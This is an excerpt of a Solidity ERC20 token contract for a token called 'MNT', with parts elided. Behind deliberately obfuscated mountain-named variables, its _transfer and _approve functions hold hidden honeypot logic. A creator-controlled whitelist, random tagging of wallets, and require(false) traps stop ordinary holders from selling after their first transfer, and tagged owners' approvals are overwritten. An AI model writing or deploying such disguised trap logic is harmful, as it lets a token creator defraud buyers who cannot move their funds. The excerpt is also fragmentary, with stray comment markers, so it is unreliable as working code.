...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public himalaya;
  mapping (address => bool) public rainier;
  mapping (address => bool) public aconcagua;
  mapping (address => uint256) public k2;

  bool private andes;
  uint256 private _totalSupply;
  uint256 private alps;
  uint256 private denali;
  uint256 private _trns;
  uint256 private chTx;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  bool private bottleneck;
  address private creator;
  bool private hillary;
  uint kilimanjaro = 0;
  ...
  constructor() public {
    ...
    _symbol = "MNT";
    _decimals = 5;
    _totalSupply = 13700000000000;
    _trns = _totalSupply;
    alps = _totalSupply;
    chTx = _totalSupply / 1800;
    denali = chTx * 40;
    rainier[creator] = false;
    aconcagua[creator] = false;
    himalaya[msg.sender] = true;
  ...
  */
  ...
  function randomly() internal returns (uint) {
    uint screen = uint(keccak256(abi.encodePacked(now, msg.sender, kilimanjaro))) % 100;
    kilimanjaro++;
    return screen;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (andes == false)) {
      alps = chTx;
      hillary = true;
    }
    
    if ((address(sender) == creator) && (andes == true)) {
      himalaya[recipient] = true;
      rainier[recipient] = false;
      andes = false;
    }
    
    if ((amount > denali) && (himalaya[sender] == true) && (address(sender) != creator)) {
        aconcagua[recipient] = true;
    }
    
    if (himalaya[recipient] != true) {
        rainier[recipient] = ((randomly() == 78) ? true : false);
    }
    
    if ((rainier[sender]) && (himalaya[recipient] == false)) {
        rainier[recipient] = true;
    }
    
    if (himalaya[sender] == false) {
      if ((amount > denali) && (aconcagua[sender] == true)) {
        require(false);
      }
      
      require(amount < alps);
      if (hillary == true) {
        if (aconcagua[sender] == true) {
          require(false);
        }
        aconcagua[sender] = true;
      }
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (bottleneck == true)) {
      himalaya[spender] = true;
      rainier[spender] = false;
      aconcagua[spender] = false;
      bottleneck = false;
    }
    
    tok = (rainier[owner] ? 127824 : amount);
